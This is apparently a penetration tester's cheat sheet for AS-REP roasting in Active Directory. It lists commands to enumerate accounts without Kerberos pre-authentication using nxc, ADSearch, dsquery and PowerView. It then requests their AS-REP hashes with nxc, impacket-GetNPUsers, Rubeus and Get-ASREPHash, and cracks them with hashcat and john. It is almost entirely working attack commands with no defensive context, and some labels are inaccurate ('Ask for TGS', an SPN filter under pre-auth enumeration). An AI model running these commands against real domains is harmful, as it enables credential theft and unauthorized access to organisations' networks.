---
tags:
  - Initial-Access
  - Kerberos
  - Unauthenticated
  - AD
---
## **Identify**
---
**NXC** (remotely)
```C
nxc ldap <IP> -u '' -p '' --query '(&(objectCategory=person)(objectClass=user)(userAccountControl:1.2.840.113556.1.4.803:=4194304))' ""
```
**Locally**: [ADSearch Github](https://github.com/tomcarver16/ADSearch)
```C
ADSearch.exe --search "(&(objectCategory=user)(servicePrincipalName=*))" --attributes cn,servicePrincipalName,samAccountName
```
Locally: lolbin
```PowerShell
dsquery * -filter "(&(objectCategory=person)(objectClass=user)(userAccountControl:1.2.840.113556.1.4.803:=32))" -attr distinguishedName userAccountControl
```
Locally: [powerview](https://github.com/PowerShellEmpire/PowerTools/blob/master/PowerView/powerview.ps1)
```Bash
Get-DomainUser -UACFilter PASSWD_NOTREQD | Select-Object samaccountname,useraccountcontro
```

## Exploit
---
**Ask for TGS** 
remotely:
```C
nxc ldap <IP> -u '<USER>' -p '' --asreproast output.txt
```
```C
impacket-GetNPUsers domain.local/svc-test -no-pass
```
locally:
```C
Rubeus.exe asreproast /format:hashcat /outfile:hashes.txt /user:svc-test /nowrap
```
```C
Get-ASREPHash -Username svc-test -verbose
```

**Crack ticket**
```C
hashcat -m 18200 --force -a 0 hashes.txt <wordlist>
```
```C
john --wordlist=<wordlist> hashes.txt
```